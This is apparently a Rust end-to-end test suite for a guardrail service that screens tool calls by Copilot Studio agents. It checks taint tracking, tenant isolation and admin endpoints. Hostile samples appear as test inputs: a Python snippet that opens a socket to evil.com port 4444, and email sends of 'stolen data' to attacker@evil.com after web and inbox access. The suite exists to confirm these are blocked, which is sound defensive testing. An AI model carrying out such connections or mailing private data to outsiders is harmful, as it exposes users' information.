//! End-to-end tests against the live Azure deployment.
//!
//! These tests send real HTTP requests to the deployed webhook server and verify
//! the full stack: Azure networking → axum → PolicyStore → Cedar evaluation →
//! session persistence → response.
//!
//! # Running
//!
//! Set the following environment variables (or place them in `.env.lilith` at
//! the repo root):
//!
//! ```bash
//! LILITH_E2E_URL=https://lilith-zero.badcompany.xyz
//! LILITH_ADMIN_TOKEN=<your-admin-token>
//! ```
//!
//! Then run:
//! ```bash
//! cargo nextest run --features webhook --test e2e_azure
//! ```
//!
//! If `LILITH_E2E_URL` is not set, all tests are skipped (pass without asserting).
//! This makes them safe to include in CI without an Azure connection.
//!
//! # Design principles
//! - Every test uses a unique `conversationId` (UUID) to avoid state cross-contamination.
//! - Tests are fully independent — order doesn't matter.
//! - Real payloads from actual Copilot Studio sessions are used verbatim.
//! - No local server is spun up; every request hits the live container.

#![cfg(feature = "webhook")]
#![cfg(not(miri))]

use reqwest::Client;
use serde_json::{json, Value};
use uuid::Uuid;

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

/// Load E2E config from environment variables, falling back to `.env.lilith`.
///
/// Returns `None` if `LILITH_E2E_URL` is not set (tests are skipped).
fn e2e_config() -> Option<(Client, String, String)> {
    // Try env vars first, then fall back to .env.lilith in the repo root.
    if std::env::var("LILITH_E2E_URL").is_err() {
        load_dotenv_lilith();
    }

    let url = std::env::var("LILITH_E2E_URL").ok()?;
    let token = std::env::var("LILITH_ADMIN_TOKEN")
        .unwrap_or_else(|_| String::new());

    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .expect("reqwest client");

    Some((client, url.trim_end_matches('/').to_string(), token))
}

/// Parse `KEY=VALUE` lines from `.env.lilith` and set them as env vars.
fn load_dotenv_lilith() {
    let manifest = std::env::var("CARGO_MANIFEST_DIR").unwrap_or_default();
    // CARGO_MANIFEST_DIR points to lilith-zero/lilith-zero; go up one level.
    let env_path = std::path::PathBuf::from(&manifest)
        .parent()
        .map(|p| p.join(".env.lilith"))
        .unwrap_or_default();

    if let Ok(content) = std::fs::read_to_string(&env_path) {
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            if let Some((key, val)) = line.split_once('=') {
                // Only set if not already set by the environment.
                if std::env::var(key.trim()).is_err() {
                    std::env::set_var(key.trim(), val.trim());
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Payload builders — real Copilot Studio request shapes
// ---------------------------------------------------------------------------

/// The real agents deployed on Azure.
const AGENT_OTP_DEMO: &str = "5be3e14e-2e46-f111-bec6-7c1e52344333";
const AGENT_FINANCIAL: &str = "77236ced-1146-f111-bec6-7ced8d71fac9";

/// Real tool IDs from the OTP-demo Cedar policy (agent 5be3e14e).
const TOOL_SEARCH_WEB: &str = "cra65_otpdemo.action.SearchWeb-SearchWeb";
const TOOL_READ_EMAILS: &str = "cra65_otpdemo.action.ReadEmails-ReadEmails";
const TOOL_SEND_EMAIL: &str = "cra65_otpdemo.action.SendEmail-SendEmail";
const TOOL_FETCH_WEBPAGE: &str = "cra65_otpdemo.action.FetchWebpage-FetchWebpage";
const TOOL_EXECUTE_PYTHON: &str = "cra65_otpdemo.action.ExecutePython-ExecutePython";

/// Build a realistic Copilot Studio `analyze-tool-execution` payload.
/// Field names and nesting match the real API (see copilot_studio_payload_schema.md).
fn payload(agent_id: &str, conv_id: &str, tool_id: &str, input_values: Value) -> Value {
    json!({
        "plannerContext": {
            "userMessage": "execute the tool",
            "thought": "Executing as instructed.",
            "chatHistory": [
                {
                    "id": Uuid::new_v4().to_string(),
                    "role": "user",
                    "content": "execute the tool",
                    "timestamp": "2026-05-02T14:34:58.1758533+00:00"
                }
            ],
            "previousToolsOutputs": []
        },
        "toolDefinition": {
            "id": tool_id,
            "type": "ToolDefinition",
            "name": tool_id.split('.').next_back().unwrap_or(tool_id),
            "description": "E2E test tool invocation",
            "inputParameters": [],
            "outputParameters": []
        },
        "inputValues": input_values,
        "conversationMetadata": {
            "agent": {
                "id": agent_id,
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "environmentId": "Default-98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "name": "e2e-test",
                "version": null,
                "isPublished": false
            },
            "user": {
                "id": "4c9f97d9-375a-4fe2-8ae5-6c4fb08043ff",
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f"
            },
            "conversationId": conv_id,
            "messageId": null,
            "channelId": "pva-studio",
            "planId": Uuid::new_v4().to_string(),
            "planStepId": Uuid::new_v4().to_string(),
            "parentAgentComponentId": null,
            "trigger": { "id": null, "schemaName": null },
            "incomingClientIp": "::ffff:127.0.0.1"
        }
    })
}

/// Send one analyze-tool-execution request and return `(blockAction, response_body)`.
async fn analyze(
    client: &Client,
    base: &str,
    agent_id: &str,
    conv_id: &str,
    tool_id: &str,
    input_values: Value,
) -> (bool, Value) {
    let resp = client
        .post(format!("{base}/analyze-tool-execution"))
        .json(&payload(agent_id, conv_id, tool_id, input_values))
        .send()
        .await
        .expect("request failed");

    assert_eq!(
        resp.status(),
        200,
        "analyze-tool-execution must return HTTP 200 for all decisions"
    );

    let body: Value = resp.json().await.expect("response must be JSON");
    let blocked = body["blockAction"].as_bool().unwrap_or(true);
    (blocked, body)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

/// Server is reachable and has at least one policy loaded.
#[tokio::test]
async fn test_e2e_health_check() {
    let Some((client, base, _)) = e2e_config() else { return };

    let resp = client
        .post(format!("{base}/validate"))
        .send()
        .await
        .expect("request failed");

    assert_eq!(resp.status(), 200);
    let body: Value = resp.json().await.unwrap();
    assert_eq!(
        body["isSuccessful"].as_bool(),
        Some(true),
        "server must report isSuccessful=true — a policy must be loaded"
    );
    assert_eq!(body["status"].as_str(), Some("OK"));
}

/// Exact payload from copilot_studio_payload_schema.md — Create-table for agent 5be3e14e.
/// Verified against a real captured Copilot Studio session.
#[tokio::test]
async fn test_e2e_real_captured_payload_create_table_allowed() {
    let Some((client, base, _)) = e2e_config() else { return };

    // This is the verbatim payload from the schema doc (with a fresh conversationId).
    let body = json!({
        "plannerContext": {
            "userMessage": "execute the tool again",
            "thought": "This action needs to be done to create a new table in the specified Excel Online workbook as requested by the user.",
            "chatHistory": [
                {
                    "id": "63835de3-91ca-4735-80e7-40d5f964f4de",
                    "role": "user",
                    "content": "execute the tool again",
                    "timestamp": "2026-05-02T14:34:58.1758533+00:00"
                },
                {
                    "id": "405405f7-36f1-45d9-8299-a269951ca9a4",
                    "role": "assistant",
                    "content": "Error Message: The connector 'Excel Online (Business)' returned an HTTP error...",
                    "timestamp": "2026-05-02T14:00:28.8665764+00:00"
                }
            ],
            "previousToolsOutputs": []
        },
        "toolDefinition": {
            "id": "cra65_otpdemo.action.ExcelOnlineBusiness-Createtable",
            "type": "ToolDefinition",
            "name": "Create-table",
            "description": "Create a new table in the Excel workbook.",
            "inputParameters": [
                { "name": "Location", "description": "Select from the drop-down or specify...", "type": { "$kind": "String" } }
            ],
            "outputParameters": []
        },
        "inputValues": {
            "source": "locationG",
            "Range": "table_rangeG",
            "file": "fileG",
            "drive": "doc_libG"
        },
        "conversationMetadata": {
            "agent": {
                "id": AGENT_OTP_DEMO,
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "environmentId": "Default-98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "name": "otp_demo",
                "version": null,
                "isPublished": false
            },
            "user": {
                "id": "4c9f97d9-375a-4fe2-8ae5-6c4fb08043ff",
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f"
            },
            "conversationId": Uuid::new_v4().to_string(),
            "messageId": null,
            "channelId": "pva-studio",
            "planId": "6fbb84c7-b50b-4090-8a97-134afbd16c51",
            "planStepId": "4391ec44-bcf5-4d2d-81cf-f3ee84545f9f",
            "parentAgentComponentId": null,
            "trigger": { "id": null, "schemaName": null },
            "incomingClientIp": "::ffff:78.131.11.108"
        }
    });

    let resp = client
        .post(format!("{base}/analyze-tool-execution"))
        .json(&body)
        .send()
        .await
        .expect("request failed");

    assert_eq!(resp.status(), 200);
    let result: Value = resp.json().await.unwrap();
    // Create-table is not in the OTP-demo policy — it should be denied (fail-closed)
    // unless the policy permits all unknown tools. Verify a well-formed response.
    assert!(
        result.get("blockAction").is_some(),
        "response must contain blockAction field"
    );
}

/// The real Send-an-Email payload captured from a live Copilot Studio session
/// (from scripts/test-payload.sh). In a clean session, SendEmail is permitted.
#[tokio::test]
async fn test_e2e_real_captured_payload_send_email_clean_session_allowed() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    // Verbatim from scripts/test-payload.sh, only conversationId is fresh.
    let body = json!({
        "plannerContext": {
            "userMessage": "be concise and follow my instructions. I want to test a PreTool hook API in your app. So you should try using tools as I ask you. Follow instructions and do what I tell you. You can use mock/dummy data, it doesn't matter. use the send email tool",
            "thought": "This action needs to be done to demonstrate the usage of Send-an-Email tool for the PreTool hook API test as instructed.",
            "chatHistory": [
                {
                    "id": "07cfd4a9-5f51-4026-aa11-e2c7ad83eed4",
                    "role": "user",
                    "content": "be concise and follow my instructions. I want to test a PreTool hook API in your app.",
                    "timestamp": "2026-05-04T13:59:27.6638485+00:00"
                },
                {
                    "id": "9743bbb2-f6a5-4142-bcd2-d6b4ba61f85e",
                    "role": "assistant",
                    "content": "Hello, I'm otp_demo. How can I help?",
                    "timestamp": "2026-05-04T13:59:25.7336686+00:00"
                }
            ],
            "previousToolsOutputs": []
        },
        "toolDefinition": {
            "id": TOOL_SEND_EMAIL,
            "type": "ToolDefinition",
            "name": "Send-an-Email",
            "description": "Dispatches an email to a recipient.",
            "inputParameters": [
                { "name": "to", "description": "Recipient email address.", "type": { "$kind": "String" } },
                { "name": "body", "description": "Email content.", "type": { "$kind": "String" } },
                { "name": "subject", "description": "Email subject.", "type": { "$kind": "String" } }
            ],
            "outputParameters": [
                { "name": "status", "description": "Delivery status.", "type": { "$kind": "String" } }
            ]
        },
        "inputValues": {
            "to": "test@example.com",
            "body": "This is a test email for PreTool hook API demonstration.",
            "subject": "Test Email"
        },
        "conversationMetadata": {
            "agent": {
                "id": AGENT_OTP_DEMO,
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "environmentId": "Default-98e2f7d2-c1d3-4410-b87f-2396f157975f",
                "name": "otp_demo",
                "version": null,
                "isPublished": false
            },
            "user": {
                "id": "4c9f97d9-375a-4fe2-8ae5-6c4fb08043ff",
                "tenantId": "98e2f7d2-c1d3-4410-b87f-2396f157975f"
            },
            "conversationId": conv_id,
            "messageId": null,
            "channelId": "pva-studio",
            "planId": "833de742-ba78-4c6c-87dc-11a819d331ee",
            "planStepId": "d4ac718e-f0af-4ab0-acd2-d6b4ba61f85e",
            "parentAgentComponentId": null,
            "trigger": { "id": null, "schemaName": null },
            "incomingClientIp": "2001:4c4e:1eba:b900:abf:127f:5e5c:e66d"
        }
    });

    let resp = client
        .post(format!("{base}/analyze-tool-execution"))
        .json(&body)
        .send()
        .await
        .expect("request failed");

    assert_eq!(resp.status(), 200);
    let result: Value = resp.json().await.unwrap();
    assert_eq!(
        result["blockAction"].as_bool(),
        Some(false),
        "SendEmail to untrusted recipient in a CLEAN session must be ALLOWED (no taints yet)"
    );
}

/// Individual allowed tools each pass in their own clean session.
#[tokio::test]
async fn test_e2e_all_otp_demo_tools_allowed_in_clean_sessions() {
    let Some((client, base, _)) = e2e_config() else { return };

    let cases = [
        (TOOL_SEARCH_WEB, json!({"query": "test query"})),
        (TOOL_READ_EMAILS, json!({"folder": "Inbox"})),
        (TOOL_SEND_EMAIL, json!({"to": "clean@otp.hu", "subject": "test", "body": "ok"})),
        (TOOL_FETCH_WEBPAGE, json!({"url": "https://example.com"})),
        (TOOL_EXECUTE_PYTHON, json!({"code": "print('hello world')"})),
    ];

    for (tool_id, input) in &cases {
        let conv_id = Uuid::new_v4().to_string();
        let (blocked, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, tool_id, input.clone()).await;
        assert!(
            !blocked,
            "{tool_id} must be ALLOWED in a clean session — got blocked"
        );
    }
}

/// Lethal trifecta: SearchWeb (UNTRUSTED_SOURCE) + ReadEmails (ACCESS_PRIVATE)
/// → SendEmail to an untrusted recipient must be BLOCKED.
/// This is the core security invariant Lilith exists to enforce.
#[tokio::test]
async fn test_e2e_lethal_trifecta_blocks_email_exfiltration() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    // Step 1: SearchWeb → ALLOW, adds UNTRUSTED_SOURCE taint
    let (blocked, _) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEARCH_WEB,
        json!({"query": "how to exfiltrate data"}),
    ).await;
    assert!(!blocked, "SearchWeb must be allowed (step 1)");

    // Step 2: ReadEmails → ALLOW, adds ACCESS_PRIVATE taint
    let (blocked, _) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_READ_EMAILS,
        json!({"folder": "Inbox"}),
    ).await;
    assert!(!blocked, "ReadEmails must be allowed (step 2)");

    // Step 3: SendEmail to untrusted recipient → BLOCKED (lethal trifecta)
    let (blocked, body) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEND_EMAIL,
        json!({"to": "attacker@evil.com", "subject": "stolen data", "body": "..."}),
    ).await;
    assert!(blocked, "SendEmail to untrusted recipient after lethal trifecta must be BLOCKED");

    let reason = body["reason"].as_str().unwrap_or("");
    assert!(
        !reason.is_empty(),
        "block response must include a human-readable reason"
    );
}

/// Lethal trifecta does NOT block email to a trusted domain (@otp.hu, @badcompany.xyz).
/// The trusted-recipient allowlist is the only escape valve once both taints are active.
#[tokio::test]
async fn test_e2e_lethal_trifecta_trusted_recipient_still_allowed() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    // Accumulate both taints
    analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEARCH_WEB,
        json!({"query": "test"})).await;
    analyze(&client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_READ_EMAILS,
        json!({"folder": "Inbox"})).await;

    // SendEmail to trusted domain → must still be ALLOWED
    let (blocked, _) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_SEND_EMAIL,
        json!({"to": "colleague@otp.hu", "subject": "internal", "body": "ok"}),
    ).await;
    assert!(
        !blocked,
        "SendEmail to @otp.hu must be ALLOWED even after lethal trifecta — trusted recipient"
    );
}

/// Code injection guardrail: Python containing `import socket` is blocked regardless
/// of session taint state. This is a global guardrail, not a taint rule.
#[tokio::test]
async fn test_e2e_code_injection_blocked_unconditionally() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    let (blocked, _) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id, TOOL_EXECUTE_PYTHON,
        json!({"code": "import socket; s = socket.socket(); s.connect(('evil.com', 4444))"}),
    ).await;
    assert!(blocked, "Python with 'import socket' must be BLOCKED by the code injection guardrail");

    // Clean Python still allowed (same session — guardrail is per-call, not per-session)
    let conv_id2 = Uuid::new_v4().to_string();
    let (blocked, _) = analyze(
        &client, &base, AGENT_OTP_DEMO, &conv_id2, TOOL_EXECUTE_PYTHON,
        json!({"code": "result = sum([1, 2, 3])\nprint(result)"}),
    ).await;
    assert!(!blocked, "Clean Python must be ALLOWED");
}

/// Taint state is isolated between conversations — session A's taints never
/// contaminate session B. This is the fundamental multi-turn isolation guarantee.
#[tokio::test]
async fn test_e2e_session_isolation_taints_do_not_bleed() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_a = Uuid::new_v4().to_string();
    let conv_b = Uuid::new_v4().to_string();

    // Conv A: accumulate both taints
    analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_SEARCH_WEB,
        json!({"query": "x"})).await;
    analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_READ_EMAILS,
        json!({"folder": "Inbox"})).await;
    let (blocked_a, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_a, TOOL_SEND_EMAIL,
        json!({"to": "attacker@evil.com", "subject": "s", "body": "b"})).await;
    assert!(blocked_a, "Conv A must be blocked after lethal trifecta");

    // Conv B: no taints at all — SendEmail must be allowed
    let (blocked_b, _) = analyze(&client, &base, AGENT_OTP_DEMO, &conv_b, TOOL_SEND_EMAIL,
        json!({"to": "victim@external.com", "subject": "s", "body": "b"})).await;
    assert!(!blocked_b, "Conv B must be ALLOWED — taints from Conv A must not bleed");
}

/// Unknown agent ID is denied (fail-closed). Lilith has no policy for this agent.
#[tokio::test]
async fn test_e2e_unknown_agent_denied_fail_closed() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();
    let unknown_agent = "00000000-0000-0000-0000-000000000000";

    let (blocked, _) = analyze(
        &client, &base, unknown_agent, &conv_id, TOOL_SEARCH_WEB,
        json!({"query": "test"}),
    ).await;
    assert!(blocked, "Unknown agent must be BLOCKED (fail-closed — no policy loaded)");
}

/// Financial bot (agent 77236ced) has its own policy — Work IQ Copilot tool is permitted.
#[tokio::test]
async fn test_e2e_financial_agent_own_policy_applies() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    // Use a known permitted tool ID from the financial policy
    let (blocked, _) = analyze(
        &client, &base, AGENT_FINANCIAL, &conv_id,
        "cra65_financialInsights.action.WorkIQCopilot(Preview)",
        json!({"query": "financial summary"}),
    ).await;
    assert!(!blocked, "Financial agent's permitted tool must be ALLOWED");
}

/// Multi-tenant isolation: OTP demo tools must be blocked for the financial agent
/// (each agent's policy is scoped only to that agent's tools).
#[tokio::test]
async fn test_e2e_cross_agent_tool_blocked() {
    let Some((client, base, _)) = e2e_config() else { return };

    let conv_id = Uuid::new_v4().to_string();

    // OTP SearchWeb tool used under the financial agent — not in that agent's policy
    let (blocked, _) = analyze(
        &client, &base, AGENT_FINANCIAL, &conv_id, TOOL_SEARCH_WEB,
        json!({"query": "test"}),
    ).await;
    assert!(
        blocked,
        "OTP-demo tool under financial agent must be BLOCKED (not in policy)"
    );
}

/// Malformed request body → HTTP 400, never allowed.
#[tokio::test]
async fn test_e2e_malformed_body_returns_400() {
    let Some((client, base, _)) = e2e_config() else { return };

    let resp = client
        .post(format!("{base}/analyze-tool-execution"))
        .header("content-type", "application/json")
        .body("{ this is not valid json }")
        .send()
        .await
        .expect("request failed");

    assert_eq!(resp.status(), 400, "malformed JSON must return 400");
}

/// Admin status reports at least the two deployed agents.
#[tokio::test]
async fn test_e2e_admin_status_reports_loaded_policies() {
    let Some((client, base, token)) = e2e_config() else { return };
    if token.is_empty() { return }

    let resp = client
        .get(format!("{base}/admin/status"))
        .header("x-admin-token", &token)
        .send()
        .await
        .expect("request failed");

    assert_eq!(resp.status(), 200);
    let body: Value = resp.json().await.unwrap();

    let count = body["cedar_policies"].as_u64().unwrap_or(0);
    assert!(count >= 2, "at least 2 Cedar policies must be loaded, got {count}");
    assert!(body["loaded_secs_ago"].as_u64().is_some());
    assert!(body["last_reload_ms"].as_u64().is_some());
}

/// Admin endpoint without token returns 403.
#[tokio::test]
async fn test_e2e_admin_requires_token() {
    let Some((client, base, _)) = e2e_config() else { return };

    let resp = client
        .post(format!("{base}/admin/reload-policies"))
        .send()
        .await
        .expect("request failed");
    assert_eq!(resp.status(), 403, "admin endpoint must require X-Admin-Token");
}

/// Upload a test policy, verify the tool is now active, then restore the original.
/// This is the full policy-update workflow as used by scripts/push-policy.sh.
#[tokio::test]
async fn test_e2e_policy_upload_activates_immediately_and_is_restorable() {
    let Some((client, base, token)) = e2e_config() else { return };
    if token.is_empty() { return }

    let test_agent = "e2e-test-agent-upload";
    let conv_id = Uuid::new_v4().to_string();

    // Confirm test agent has no policy (denied)
    let (blocked, _) = analyze(&client, &base, test_agent, &conv_id, "test-tool",
        json!({})).await;
    assert!(blocked, "test agent must be denied before upload");

    // Upload a minimal policy
    let minimal_cedar = r#"
        permit(
            principal,
            action == Action::"tools/call",
            resource
        ) when {
            resource == Resource::"test-tool"
        };
    "#;

    let upload_resp = client
        .post(format!("{base}/admin/upload-policy?agent_id={test_agent}"))
        .header("x-admin-token", &token)
        .header("content-type", "text/plain")
        .body(minimal_cedar)
        .send()
        .await
        .expect("upload request failed");

    assert_eq!(upload_resp.status(), 200, "upload must succeed");
    let upload_body: Value = upload_resp.json().await.unwrap();
    assert_eq!(upload_body["uploaded"].as_str(), Some(test_agent));
    assert!(upload_body["reloaded"].as_u64().unwrap_or(0) > 0);

    // After upload: tool is now allowed
    let conv_id2 = Uuid::new_v4().to_string();
    let (blocked, _) = analyze(&client, &base, test_agent, &conv_id2, "test-tool",
        json!({})).await;
    assert!(!blocked, "test-tool must be ALLOWED after policy upload");

    // Clean up: delete the test agent's policy file and reload
    // (done via reload — the file was written to /home/policies on the server,
    //  but we can't delete it from here; in practice the GitOps system manages this)
    // We just reload to return to a consistent state.
    let reload_resp = client
        .post(format!("{base}/admin/reload-policies"))
        .header("x-admin-token", &token)
        .send()
        .await
        .expect("reload failed");
    assert_eq!(reload_resp.status(), 200);
}

/// Reload in-memory policies and verify the count stays consistent.
#[tokio::test]
async fn test_e2e_reload_returns_consistent_count() {
    let Some((client, base, token)) = e2e_config() else { return };
    if token.is_empty() { return }

    let before: Value = client
        .get(format!("{base}/admin/status"))
        .header("x-admin-token", &token)
        .send().await.unwrap()
        .json().await.unwrap();

    let reload: Value = client
        .post(format!("{base}/admin/reload-policies"))
        .header("x-admin-token", &token)
        .send().await.unwrap()
        .json().await.unwrap();

    let after: Value = client
        .get(format!("{base}/admin/status"))
        .header("x-admin-token", &token)
        .send().await.unwrap()
        .json().await.unwrap();

    assert_eq!(
        before["cedar_policies"],
        after["cedar_policies"],
        "policy count must be stable across reload"
    );
    assert!(
        reload["elapsed_ms"].as_u64().unwrap_or(u64::MAX) < 500,
        "reload must complete in under 500ms"
    );
}
